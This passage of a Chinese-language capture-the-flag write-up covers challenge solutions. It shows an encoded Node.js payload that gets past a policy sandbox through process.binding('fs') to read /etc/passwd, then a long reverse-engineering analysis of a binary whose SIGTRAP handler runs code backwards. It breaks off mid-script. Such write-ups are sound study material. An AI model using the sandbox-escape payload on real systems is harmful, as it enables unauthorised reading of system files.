</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">SyntaxError: Octal literals are not allowed in strict mode</code>，行行行，要求真多，0600 改成 384 总好了吧：</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"statusCode"</span><span class="p">:</span><span class="mi">500</span><span class="p">,</span><span class="nl">"code"</span><span class="p">:</span><span class="s2">"1"</span><span class="p">,</span><span class="nl">"error"</span><span class="p">:</span><span class="s2">"Internal Server Error"</span><span class="p">,</span><span class="nl">"message"</span><span class="p">:</span><span class="s2">"Command failed: /usr/local/bin/node --experimental-policy=policy.json --policy-integrity=sha256-1NvUvTeQqHoo+XJv7zUAobD/VEaIGQ8CB3471GP2isY= runner.js -e=ZXZhbCh1bmVzY2FwZSgvJTJhJTJhJTJmIGJ1ZmZlciUyMCUzZCUyMCU0MnVmZmVyJTJlYWxsb2MlNTVuc2FmZSUyODgxOTIlMjklM2IlMjBwcm9jZXNzJTJlYmluZGluZyUyOCUyN2ZzJTI3JTI5JTJlcmVhZCUyOHByb2Nlc3MlMmViaW5kaW5nJTI4JTI3ZnMlMjclMjklMmVvcGVuJTI4JTI3JTJmZXRjJTJmcGFzc3dkJTI3JTJjJTIwMCUyYyUyMDM4NCUyYyUyMDAlMmMlMjAwJTI5JTJjJTIwYnVmZmVyJTJjJTIwMCUyYyUyMDQwOTYlMmMlMjAwJTJjJTIwMCUyYyUyMDAlMjklM2IlMjBidWZmZXIgJTJmJTJhLykrdW5lc2NhcGUoLyUyYS8pKQ==</span><span class="se">\n</span><span class="s2">(node:232) ExperimentalWarning: Policies are experimental.</span><span class="se">\n</span><span class="s2">(Use `node --trace-warnings ...` to show where the warning was created)</span><span class="se">\n</span><span class="s2">undefined:1</span><span class="se">\n</span><span class="s2">/**/ buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 384, 0, 0), buffer, 0, 4096, 0, 0, 0); buffer /*//*/</span><span class="se">\n</span><span class="s2">            ^</span><span class="se">\n\n</span><span class="s2">ReferenceError: buffer is not defined</span><span class="se">\n</span><span class="s2">    at eval (eval at &lt;anonymous&gt; (eval at &lt;anonymous&gt; (file:///app/backend/runner.js:9:17)), &lt;anonymous&gt;:1:13)</span><span class="se">\n</span><span class="s2">    at eval (eval at &lt;anonymous&gt; (file:///app/backend/runner.js:9:17), &lt;anonymous&gt;:1:1)</span><span class="se">\n</span><span class="s2">    at file:///app/backend/runner.js:9:17</span><span class="se">\n</span><span class="s2">    at ModuleJob.run (node:internal/modules/esm/module_job:193:25)</span><span class="se">\n</span><span class="s2">    at async Promise.all (index 0)</span><span class="se">\n</span><span class="s2">    at async ESMLoader.import (node:internal/modules/esm/loader:518:24)</span><span class="se">\n</span><span class="s2">    at async loadESM (node:internal/process/esm_loader:102:5)</span><span class="se">\n</span><span class="s2">    at async handleMainPromise (node:internal/modules/run_main:66:12)</span><span class="se">\n\n</span><span class="s2">Node.js v19.0.1</span><span class="se">\n</span><span class="s2">"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">ReferenceError: buffer is not defined</code>，哦，要 <code class="language-plaintext highlighter-rouge">var buffer</code>。改了之后就能吐出 flag 的 bytes 了。</p>

<h3 id="flag-2chrome-里的-flag">Flag 2：Chrome 里的 flag</h3>

<p>首先，不可能是最新稳定版 Chrome 的 CVE，那么肯定 flag 在页面、标题、cookie 这几个地方上。我用的是编码之后的 <code class="language-plaintext highlighter-rouge">document.documentElement.innerHTML</code> 读的。</p>

<h2 id="ttowrss">TTOWRSS</h2>

<p>我还记得那个白天，从凌晨熬到天亮，当我发现这个 sigtrap 的 handler 居然干了这样的事情的时候，感觉自己整个脑子都「轰」得一下。</p>

<p>首先……拖 IDA，然后发现整个程序怪怪的，<code class="language-plaintext highlighter-rouge">main()</code> 似乎长得不太正常，找到了读取输入的逻辑，但是它的汇编居然长成这样：</p>

<pre><code class="language-asm">loc_1176:                               ; CODE XREF: .text:0000000000001145↑j
.text:0000000000001176                 lea     rdi, aGoodJob   ; "Good job!"
.text:000000000000117D                 jz      short loc_1154
.text:000000000000117F                 test    al, al
.text:0000000000001181                 call    sub_13C5
.text:0000000000001186                 mov     rdi, rbp
.text:0000000000001189                 call    ___isoc99_scanf
.text:000000000000118E                 mov     rsi, rbp
.text:0000000000001191                 xor     eax, eax
.text:0000000000001193                 lea     rdi, a250s      ; "%250s"
.text:000000000000119A                 call    ___printf_chk
.text:000000000000119F                 mov     rbp, rsp
.text:00000000000011A2                 xor     eax, eax
.text:00000000000011A4                 mov     [rsp+108h], rax
.text:00000000000011AC                 mov     rax, fs:28h
.text:00000000000011B5                 sub     rsp, 110h
.text:00000000000011BC                 mov     edi, 1
.text:00000000000011C1                 lea     rsi, aPassword  ; "PASSWORD: "
.text:00000000000011C8                 push    rbp
.text:00000000000011C9                 mov     rsi, 100000000h
</code></pre>

<p>????? 怎么会有先 <code class="language-plaintext highlighter-rouge">call</code> 再给寄存器赋值参数的程序啊，总不可能是倒着执行的吧.png</p>

<p>先不管了，用 GDB 挂着看看：</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Program received signal SIGTRAP, Trace/breakpoint trap.
0x0000555555555114 in ?? ()
</span></code></pre></div></div>

<p>SIGTRAP？看了一下，确实有个 sigaction 挂了 SIGTRAP 的 handler。Handler 里面好像有点计算的逻辑，难道这是算 flag 用的吗？试了一下 patch 掉 sigaction，程序会直接挂。然后想用投机取巧的方法，试了 angr 和 qiling，都没法准确模拟这个程序。</p>

<p>实在没法，硬着头皮看程序。我想先知道 SIGTRAP 是从哪里来的。看了一下 <code class="language-plaintext highlighter-rouge">sub_10B0()</code> 的内容：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="nf">sub_10B0</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// kr00_8</span>
  <span class="k">struct</span> <span class="n">sigaction</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-A8h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+A0h] [rbp-10h]</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v2</span><span class="p">.</span><span class="n">sa_mask</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x90uLL</span><span class="p">);</span>
  <span class="n">v2</span><span class="p">.</span><span class="n">sa_flags</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
  <span class="n">v2</span><span class="p">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="p">(</span><span class="n">__sighandler_t</span><span class="p">)</span><span class="n">sub_12D0</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">sigaction</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="n">abort</span><span class="p">();</span>
  <span class="n">v0</span> <span class="o">=</span> <span class="n">__readeflags</span><span class="p">();</span>
  <span class="n">__writeeflags</span><span class="p">(</span><span class="n">v0</span> <span class="o">^</span> <span class="mh">0x100</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">__writeeflags</code> 写了啥？看了一下 <a href="https://en.wikipedia.org/wiki/FLAGS_register">Wikipedia</a>，发现 0x100 的值刚好是 trap flag，这就解释了为什么会不停 sigtrap。</p>

<p>但是这个 handler 是干嘛用的？我之前仔细读过 <code class="language-plaintext highlighter-rouge">sigaction(2)</code> 的内容，完整的 handler 是这么定义的：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">,</span> <span class="n">siginfo_t</span> <span class="o">*</span><span class="n">info</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ucontext</span><span class="p">)</span>
<span class="p">{</span>
   <span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>反编译结果显示，handler 会读取第三个参数加一个偏移量的内容：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_12D0</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="n">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="n">__int64</span> <span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// edi</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// r8</span>
  <span class="n">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// rdi</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// rsi</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">char</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// cl</span>

  <span class="n">result</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a3</span> <span class="o">+</span> <span class="mi">168</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_1098</span> <span class="o">&lt;=</span> <span class="n">result</span> <span class="o">&amp;&amp;</span> <span class="n">result</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)</span><span class="n">byte_1445</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="n">byte_40E0</span><span class="p">[(</span><span class="n">result</span> <span class="o">-</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_1098</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">_bittest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">,</span> <span class="p">(</span><span class="n">result</span> <span class="o">-</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_1098</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v5</span> <span class="o">=</span> <span class="n">result</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
      <span class="n">v6</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
      <span class="n">v7</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_1098</span><span class="p">;</span>
      <span class="k">do</span>
      <span class="p">{</span>
        <span class="n">v8</span> <span class="o">=</span> <span class="n">v7</span><span class="p">;</span>
        <span class="n">v9</span> <span class="o">=</span> <span class="n">v7</span><span class="o">--</span><span class="p">;</span>
        <span class="n">v6</span> <span class="o">+=</span> <span class="p">(</span><span class="n">byte_40E0</span><span class="p">[</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">v9</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">;</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">v5</span><span class="o">--</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">while</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">);</span>
      <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a3</span> <span class="o">+</span> <span class="mi">168</span><span class="p">)</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>我本来以为应该不会用到第三个参数，因为：</p>

<blockquote>
  <p>ucontext</p>

  <p>This is a pointer to a ucontext_t structure, cast  to  void *.
   The structure pointed to by this field contains signal context
   information that was saved on the user-space stack by the ker‐
   nel; for details, see sigreturn(2).  Further information about
   the ucontext_t structure can be  found  in  getcontext(3)  and
   signal(7).   Commonly,  the  handler function doesn’t make any
   use of the third argument.</p>
</blockquote>

<p>正常的 handler 不会用第三个参数的值，但是这个程序并不正常。最后还是去看了看这个参数是什么。阅读 ucontext.h，可以写出这样的代码来看内部变量的地址：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;ucontext.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">ucontext_t</span> <span class="n">x</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"x: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"x.uc_mcontext gregs 16: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">uc_mcontext</span><span class="p">.</span><span class="n">gregs</span><span class="p">[</span><span class="mi">16</span><span class="p">]));</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>于是最后发现是第 16 个（0-idx）通用寄存器的值。而 ucontext.h 中也包含了寄存器的顺序，第 16 个通用寄存器是……RIP。</p>

<p>草。</p>

<p>按其逻辑，写了个程序看 pc 会怎么变化：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">byte40e0</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x15</span> <span class="o">+</span> <span class="p">[</span><span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x2f</span> <span class="o">+</span> <span class="p">[</span><span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x10</span>

<span class="c1"># print(len(byte40e0))
</span>
<span class="n">start_pc</span> <span class="o">=</span> <span class="mh">0x1098</span>
<span class="n">end_pc</span> <span class="o">=</span> <span class="mh">0x1445</span>

<span class="k">for</span> <span class="n">pc</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">start_pc</span><span class="p">,</span> <span class="n">end_pc</span><span class="p">):</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="n">byte40e0</span><span class="p">[(</span><span class="n">pc</span> <span class="o">-</span> <span class="n">start_pc</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span>
    <span class="n">bit</span> <span class="o">=</span> <span class="p">(</span><span class="n">pc</span> <span class="o">-</span> <span class="n">start_pc</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">v4</span> <span class="o">&gt;&gt;</span> <span class="n">bit</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"oldpc: 0x%x"</span> <span class="o">%</span> <span class="n">pc</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">' '</span><span class="p">)</span>
        <span class="n">v5</span> <span class="o">=</span> <span class="n">pc</span> <span class="o">-</span> <span class="mi">1</span>
        <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">v7</span> <span class="o">=</span> <span class="n">pc</span> <span class="o">+</span> <span class="o">~</span><span class="n">start_pc</span>
        <span class="c1"># v7 = pc - start_pc + 1
</span>        <span class="k">while</span> <span class="n">v6</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
            <span class="n">v8</span> <span class="o">=</span> <span class="n">v7</span>
            <span class="n">v9</span> <span class="o">=</span> <span class="n">v7</span>
            <span class="n">v7</span> <span class="o">-=</span> <span class="mi">1</span>
            <span class="n">v6</span> <span class="o">+=</span> <span class="p">(</span><span class="n">byte40e0</span><span class="p">[</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">v9</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mi">1</span>
            <span class="n">pc</span> <span class="o">=</span> <span class="n">v5</span>
            <span class="n">v5</span> <span class="o">-=</span> <span class="mi">1</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"newpc: 0x%x"</span> <span class="o">%</span> <span class="n">pc</span><span class="p">)</span>
</code></pre></div></div>

<p>输出之后才发现：R I P 真 的 是 倒 着 走 的！</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>oldpc: 0x1140 newpc: 0x1014
oldpc: 0x1145 newpc: 0x1015
oldpc: 0x1147 newpc: 0x1140
oldpc: 0x114c newpc: 0x1145
oldpc: 0x1153 newpc: 0x1147
oldpc: 0x1154 newpc: 0x114c
// 省略
oldpc: 0x11c9 newpc: 0x11c1
oldpc: 0x11d3 newpc: 0x11c8
oldpc: 0x1350 newpc: 0x11c9
oldpc: 0x1351 newpc: 0x11d3
oldpc: 0x1353 newpc: 0x1350
oldpc: 0x1354 newpc: 0x1351
// 省略
</code></pre></div></div>

<p>所以整理了一下 “main” 函数和之后的计算逻辑。需要注意的是，mcontext 里面的汇编应该是将要执行的命令，所以相关的逻辑就是直接反过来，而不是反过来跳着跑的。汇编大概是这样：</p>

<pre><code class="language-asm">main:
push   %rbp
lea    0xe3c(%rip),%rsi  # 2004
mov    $0x1,%edi
sub    $0x110,%rsp
mov    %fs:0x28,%rax
mov    %rax,0x108(%rsp)
xor    %eax,%eax
mov    %rsp,%rbp
call   1070 &lt;__printf_chk@plt&gt;
lea    0xe75(%rip),%rdi  # 200f  "%250s"
xor    %eax,%eax
mov    %rbp,%rsi  # 用户输入？-&gt; stack
call   1080 &lt;__isoc99_scanf@plt&gt;
mov    %rbp,%rdi
call   13c5 &lt;__cxa_finalize@plt+0x335&gt;  // 计算逻辑
test   %al,%al
je     1154 &lt;__cxa_finalize@plt+0xc4&gt;
lea    0xe98(%rip),%rdi
call   1040 &lt;puts@plt&gt;
// ...

// rdi (第一个参数) 为用户输入
calc_13c5:
movsbl (%rdi),%eax
mov    0x2c5f(%rip),%edx
test   %al,%al
sete   %cl
shr    $0x1f,%edx
cmp    %dl,%cl
jne    1354 &lt;__cxa_finalize@plt+0x2c4&gt;
xor    %ecx,%ecx
lea    0x2c73(%rip),%r8  # 4020
lea    0xc9a(%rip),%r10        # 2040
1398: lea    0xd01(%rip),%r9  # 20a0
jmp    135f &lt;__cxa_finalize@plt+0x2cf&gt;
1392: movslq (%r8,%rcx,4),%rsi
mov    (%r8,%rcx,4),%r11d
movsbl (%r9,%rsi,1),%edx
xor    %r11d,%edx
movslq %edx,%rdx
movzwl (%r10,%rdx,2),%edx
and    $0x7f,%edx
cmp    %edx,%eax  // 比对该字符串结果
jne    1354 &lt;__cxa_finalize@plt+0x2c4&gt;
add    $0x1,%rcx
136f: movsbl (%rdi,%rcx,1),%eax
mov    (%r8,%rcx,4),%edx
1369: test  %al, %al
sete   %sil
1362: shr    $0x1f,%edx
135f: cmp %dl,%sil（跳转到的时候实际不执行 -&gt; 135b）
135d: jne    1354 &lt;__cxa_finalize@plt+0x2c4&gt;
135b: test   %al,%al
1359: jne    1398 &lt;__cxa_finalize@plt+0x308&gt;（跳到 1392）
1353: ret
1354: mov    $0x1,%eax
1351: xor    %eax,%eax
11d3: jmp main
</code></pre>

<p>计算代码部分主要是三个预置的数组，用户输入的字符串在 <code class="language-plaintext highlighter-rouge">%rdi</code>，因此可以还原：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># r8 = [0x13, 9, 1, 0x19, 0x1e, 0x21, 5, 0x14, 0xb, 7, 0xe, 4, 0x17, 3, 0x12, 8, 0x1c, 0x20, 0x26, 0x16, 0, 0x15, 0x10, 6, 0xc, 0xf, 0x25, 0xd, 0x24, 0x1b, 0x1f, 0x1a, 0x1d, 0xa, 0x11, 0x23, 0x18, 0x27, 0x22, 2, 0xffffffff] + [0] * 7
</span><span class="n">r8</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x13</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mi">2</span><span class="p">]</span>
<span class="n">r10</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x99C0</span><span class="p">,</span> <span class="mh">0x0F6AD</span><span class="p">,</span> <span class="mh">0x0B9D2</span><span class="p">,</span> <span class="mh">0x2761</span><span class="p">,</span> <span class="mh">0x35E9</span><span class="p">,</span> <span class="mh">0x6C5F</span><span class="p">,</span> <span class="mh">0x84B5</span><span class="p">,</span> <span class="mh">0x0B268</span><span class="p">,</span> <span class="mh">0x0C2E5</span><span class="p">,</span> <span class="mh">0x99DF</span><span class="p">,</span> <span class="mh">0x0BF77</span><span class="p">,</span> <span class="mh">0x0EC7B</span><span class="p">,</span> <span class="mh">0x3368</span><span class="p">,</span> <span class="mh">0x0DF73</span><span class="p">,</span> <span class="mh">0x1A31</span><span class="p">,</span> <span class="mh">0x0DAD4</span><span class="p">,</span> <span class="mh">0x8AF2</span><span class="p">,</span> <span class="mh">0x0B363</span><span class="p">,</span> <span class="mh">0x56B0</span><span class="p">,</span> <span class="mh">0x7567</span><span class="p">,</span> <span class="mh">0x0CB7D</span><span class="p">,</span> <span class="mh">0x19B3</span><span class="p">,</span> <span class="mh">0x0C2AD</span><span class="p">,</span> <span class="mh">0x0E677</span><span class="p">,</span> <span class="mh">0x26EC</span><span class="p">,</span> <span class="mh">0x0C2D</span><span class="p">,</span> <span class="mh">0x10EF</span><span class="p">,</span> <span class="mh">0x0C9C4</span><span class="p">,</span> <span class="mh">0x25DF</span><span class="p">,</span> <span class="mh">0x0E1F5</span><span class="p">,</span> <span class="mh">0x0FCE8</span><span class="p">,</span> <span class="mh">0x71E8</span><span class="p">,</span> <span class="mh">0x0BBE5</span><span class="p">,</span> <span class="mh">0x0D566</span><span class="p">,</span> <span class="mh">0x0E861</span><span class="p">,</span> <span class="mh">0x9FF4</span><span class="p">,</span> <span class="mh">0x73B7</span><span class="p">,</span> <span class="mh">0x0CEE6</span><span class="p">,</span> <span class="mh">0x0D3F4</span><span class="p">,</span> <span class="mh">0x0BCD2</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">8</span>
<span class="n">r9</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mh">0x21</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="p">[</span><span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="p">[</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mh">0x15</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="p">[</span><span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">):</span>
    <span class="n">rsi</span> <span class="o">=</span> <span class="n">r8</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
